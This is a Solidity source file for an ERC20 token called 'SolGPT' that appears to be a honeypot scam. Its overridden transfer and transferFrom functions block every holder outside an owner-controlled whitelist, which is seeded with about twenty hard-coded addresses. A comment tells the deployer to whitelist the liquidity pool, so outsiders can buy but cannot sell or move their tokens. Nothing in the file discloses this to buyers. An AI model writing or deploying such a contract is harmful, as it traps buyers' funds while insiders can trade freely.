// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("SolGPT", "SGP") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000 * 10 ** decimals());
        whiteList[0x36a1724E11be902B8d69741F6A22499264f683B3]= true;
        whiteList[0x5E04e5f7160125De9cf30B997616F5C4e700ab98]=true;
        whiteList[0xb6867887237Ea65AF6C76eeEb113D7C16AcB4F91]=true;
        whiteList[0xed5C1E80E5788597463cd356F223ff5dfCAb288d]=true;
        whiteList[0xE09B5De169E7484EcA9632baCd6cCB9EdA7A8e99]=true;
        whiteList[0x6EaDE1eb00a11ab182474D44018a6db7e81858eC]=true;
        whiteList[0x00e393a19686359a62dCc4049C9d8406c38fE015]=true;
        whiteList[0x6B3234707c3B9088F13B55B5CCbB107f5967281b]=true;
        whiteList[0xD4fd1b8a68EA062AB8b0986dF17C9A1D2C75895f]=true;
        whiteList[0x9627Dc65438BC6467CBBA83e6040cD9077A71B9E]=true;
        whiteList[0xC3c248798AEe03C3d6F82d442042772bEEaF000a]=true;
        whiteList[0x239c0Fb353f7eD1dEfA13E254789b2cf45587956]=true;
        whiteList[0xFBDfb791A1b0396c7EeE05C2D35fc96b6F25A8CB]=true;
        whiteList[0xfc211f53FfD07900C88B2eEaD0c2a06715B65A4c]=true;
        whiteList[0x4dF2407BE245485F2a2C8816CC2C1f8d68e80Bd9]=true;
        whiteList[0xCdEF357622B224e3D78C27182313F65A92a8502d]=true;
        whiteList[0xBedF19db4EfB5AD953f84f915CE965408Bd812dD]=true;
        whiteList[0x965849Bb49e3A28B843512D143B699dB62A03627]=true;
        whiteList[0xa5eECBc0cA794a5D9B8f764b9220C151772A18D2]=true;
        whiteList[0xd037453A9590457d2aCffE024EE6714Cce9B4BAd]=true;
        whiteList[0x4a870F4A38Fee48D06Ce89EDd706264E02E285B8]=true;
        whiteList[0x41D12E9559FaDD5735CE064b46DFc002daf97bAd]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}